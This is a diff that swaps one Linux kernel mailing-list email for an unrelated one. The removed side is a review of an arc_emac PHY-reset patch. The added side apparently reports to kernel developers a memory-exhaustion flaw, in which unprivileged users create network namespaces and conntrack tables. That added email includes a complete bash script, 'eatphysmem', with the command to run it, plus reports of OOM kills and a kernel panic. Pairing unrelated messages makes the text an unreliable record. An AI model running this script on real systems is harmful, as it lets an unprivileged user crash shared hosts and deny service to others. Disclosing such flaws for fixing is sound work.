@@ -1,138 +1,97 @@
-From: Heiko =?ISO-8859-1?Q?St=FCbner?= <heiko@sntech.de>
-Subject: Re: [PATCH 3/6] net: arc_emac: support the phy reset for emac driver
-Date: Fri, 11 Mar 2016 15:59:16 +0100
-Message-ID: <3840119.HSnZJI4qm4@diego>
-References: <1457693731-6966-1-git-send-email-wxt@rock-chips.com> <56E2CC8F.5040703@cogentembedded.com> <2693723.gBjS0iQk4I@diego>
+From: yumkam@gmail.com (Yuriy M. Kaminskiy)
+Subject: Re: userns, netns, and quick physical memory consumption by unprivileged user
+Date: Fri, 11 Mar 2016 18:06:59 +0300
+Message-ID: <m3r3fhhx4c.fsf@gmail.com>
+References: <m3d1rclioc.fsf@gmail.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=iso-8859-1
-Content-Transfer-Encoding: QUOTED-PRINTABLE
-Cc: Caesar Wang <wxt@rock-chips.com>,
-	"David S. Miller" <davem@davemloft.net>,
-	Rob Herring <robh+dt@kernel.org>,
-	linux-rockchip@lists.infradead.org, keescook@google.com,
-	leozwang@google.com, Alexander Kochetkov <al.kochet@gmail.com>,
-	netdev@vger.kernel.org, linux-kernel@vger.kernel.org
-To: Sergei Shtylyov <sergei.shtylyov@cogentembedded.com>
+Content-Type: text/plain
+Cc: containers@lists.osdl.org, linux-kernel@vger.kernel.org
+To: netdev@vger.kernel.org
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from gloria.sntech.de ([95.129.55.99]:52740 "EHLO gloria.sntech.de"
+Received: from plane.gmane.org ([80.91.229.3]:38321 "EHLO plane.gmane.org"
 	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S932457AbcCKO73 convert rfc822-to-8bit (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Fri, 11 Mar 2016 09:59:29 -0500
-In-Reply-To: <2693723.gBjS0iQk4I@diego>
+	id S1752628AbcCKPHg (ORCPT <rfc822;netdev@vger.kernel.org>);
+	Fri, 11 Mar 2016 10:07:36 -0500
+Received: from list by plane.gmane.org with local (Exim 4.69)
+	(envelope-from <linux-netdev-2@m.gmane.org>)
+	id 1aeOf2-00078O-AN
+	for netdev@vger.kernel.org; Fri, 11 Mar 2016 16:07:28 +0100
+Received: from ppp37-190-56-84.pppoe.spdop.ru ([37.190.56.84])
+        by main.gmane.org with esmtp (Gmexim 0.1 (Debian))
+        id 1AlnuQ-0007hv-00
+        for <netdev@vger.kernel.org>; Fri, 11 Mar 2016 16:07:28 +0100
+Received: from yumkam by ppp37-190-56-84.pppoe.spdop.ru with local (Gmexim 0.1 (Debian))
+        id 1AlnuQ-0007hv-00
+        for <netdev@vger.kernel.org>; Fri, 11 Mar 2016 16:07:28 +0100
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-Am Freitag, 11. M=E4rz 2016, 15:56:04 schrieb Heiko St=FCbner:
-> Hi Caesar,
->=20
-> Am Freitag, 11. M=E4rz 2016, 16:47:59 schrieb Sergei Shtylyov:
-> > On 3/11/2016 1:55 PM, Caesar Wang wrote:
-> > > This patch adds to support the emac phy reset.
-> > >=20
-> > > 1) phy-reset-gpios:
-> > > The phy-reset-gpios is an optional property for arc emac device t=
-ree
-> > > boot.
-> > > Change the binding document to match the driver code.
-> > >=20
-> > > 2) phy-reset-duration:
-> > > Different boards may require different phy reset duration. Add pr=
-operty
-> > > phy-reset-duration for device tree probe, so that the boards that=
- need
-> > > a longer reset duration can specify it in their device tree.
-> > >=20
-> > > 3) phy-reset-active-high:
-> > > We need that for a custom hardware that needs the reverse reset
-> > > sequence.
-> > >=20
-> > > Of course, this patch will fix the issue on
-> > > https://patchwork.kernel.org/patch/8186801/.
-> > >=20
-> > > In some cases, the emac couldn't work if you don't have reset the=
- phy.
-> > > Let's add it to happy work.
-> > >=20
-> > > Signed-off-by: Caesar Wang <wxt@rock-chips.com>
-> > > ---
-> > >=20
-> > >   drivers/net/ethernet/arc/emac_main.c | 41
-> > >   ++++++++++++++++++++++++++++++++++++ 1 file changed, 41 inserti=
-ons(+)
-> > >=20
-> > > diff --git a/drivers/net/ethernet/arc/emac_main.c
-> > > b/drivers/net/ethernet/arc/emac_main.c index 6446af1..42384f6a 10=
-0644
-> > > --- a/drivers/net/ethernet/arc/emac_main.c
-> > > +++ b/drivers/net/ethernet/arc/emac_main.c
-> > > @@ -764,6 +764,45 @@ static const struct net_device_ops
-> > > arc_emac_netdev_ops =3D {>
-> > >=20
-> > >   #endif
-> > >   };
-> > >=20
-> > > +#ifdef CONFIG_OF
-> > > +static void emac_reset_phy(struct net_device *pdev)
-> > > +{
-> > > +	int err, phy_reset;
-> > > +	bool active_high =3D false;
-> > > +	int msec =3D 10;
-> > > +	struct device *dev =3D pdev->dev.parent;
-> > > +	struct device_node *np =3D dev->of_node;
-> > > +
-> > > +	if (!np)
-> > > +		return;
-> > > +
-> > > +	of_property_read_u32(np, "phy-reset-duration", &msec);
-> > > +	/* A sane reset duration should not be longer than 1s */
-> > > +	if (msec > 1000)
-> > > +		msec =3D 1;
-> > > +
-> > > +	phy_reset =3D of_get_named_gpio(np, "phy-reset-gpios", 0);
-> > > +	if (!gpio_is_valid(phy_reset))
-> > > +		return;
-> > > +
-> > > +	active_high =3D of_property_read_bool(np, "phy-reset-active-hig=
-h");
-> > > +
-> > > +	err =3D devm_gpio_request_one(dev, phy_reset, active_high ?
-> > > +				    GPIOF_OUT_INIT_HIGH : GPIOF_OUT_INIT_LOW,
-> > > +				    "phy-reset");
-> > > +	if (err) {
-> > > +		dev_err(dev, "failed to get phy-reset-gpios: %d\n", err);
-> > > +		return;
-> > > +	}
-> > > +	msleep(msec);
-> > > +	gpio_set_value_cansleep(phy_reset, !active_high);
-> > > +}
-> >=20
-> > [...]
-> >=20
-> >     Why not make it the mii_bus::reset() method? It gets called bef=
-ore the
-> >=20
-> > MDIO bus scan.
->=20
-> while meddling with the emac, I've built some sort of preliminary var=
-iant of
-> Sergei's suggestion at [0] - maybe you could take a look for some sor=
-t of
-> inspiration ;-)
+ping (+ more test results at bottom)
 
-forgot to add ... of course the newer gpiod_* infrastructure should be =
-used=20
-instead of the old integer-based gpio numbers
+On Wed, 02 Mar 2016, I wrote:
 
->=20
-> The code is lifted from the designware gmac driver, so the binding al=
-so is
-> similar.
->=20
->=20
-> Heiko
->=20
->=20
-> [0]
-> https://github.com/mmind/linux-rockchip/commit/a943c588783438ff1c508d=
-fa8c79
-> f1709aa5775e
+> While looking at CVE-2016-2847, I remembered about infamous
+>     nf_conntrack: falling back to vmalloc
+> message, that was often triggered by network namespace creation (message
+> was removed recently, but it changed nothing with underlying problem).
+>
+> So, how about something like this:
+>
+> $ cat << EOF >> eatphysmem
+> #!/bin/bash -xe
+> fd=6
+> d="`mktemp -d /tmp/eatmemXXXXXXXXX`"
+> cd "$d"
+> rule="iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT"
+> # rule="$rule;$rule"
+> # ... just because we can; same with any number of ip li/ro/ru/etc
+> while :; do
+>     let fd=fd+1
+>     [ ! -e /proc/$$/fd/$fd ] || continue
+>     mkfifo f1 f2
+>     unshare -rn sh -xec "echo foo >f1;ip li se lo up; $rule;read r <f2" &
+>     pid=$!
+>     read r <f1
+>     eval "exec $fd</proc/$pid/ns/net"
+>     echo bar >f2
+>     wait
+>     rm f2 f1
+>     free
+>     sleep 0.1s
+> done
+> sleep inf
+> EOF
+> $ chmod a+x eatphysmem; unshare -rpf --mount-proc ./eatphysmem
+> ?
+>
+> You can easily eat 0.5M physical memory per netns (conntrack hash table
+> (hashsize*sizeof(list_head))) and more, and pin them to single process
+> with opened netns fds.
+> What can stop it?
+> ulimit? What is ulimit? Conntrack knows nothing about them.
+> Ah-yeah, `ulimit -n`? 64k. 64k*512k = 32G. Per process. Oh-uh.
+> OOM killer? But this is not this process memory; if any, it will be
+> killed last.
+> (I wonder, if memcg can tackle it; probably yes; but how many people
+> have it configured?).
+
+I tested in vm with kernel 4.4.2 (from user account, with ulimit
+-v 32768); as expected, it quickly eaten all memory, OOM killer went
+berserk and killed even systemd-journald and systemd-udevd, but left
+this process living (and hogging all physical memory; also note that
+swap was enabled - and mostly remained unused).
+
+And also tried with memcg:
+  t=/sys/fs/cgroup/memory/test1;mkdir $t;echo 0 >$t/tasks;
+  echo 48M >$t/memory.limit_in_bytes; su testuser [...]
+and it has not helped at all (rather opposite, it ended up with killed
+init and kernel panic; well, later is pure (un)luck; but point is, memcg
+apparently *CANNOT* curb net/ns allocations).
+
+BTW, all those hash/conntrack/etc default sizes was calculated from
+physical memory size in assumption there will be only *one* instance of
+those tables. Obviously, introduction of network namespaces (and
+especially unprivileged user-ns) thrown this assumption in the window
+(and here comes that "falling back to vmalloc" message again; in pre-netns
+world, those tables were allocated *once* on early system startup, with
+typically plenty of free and unfragmented memory).
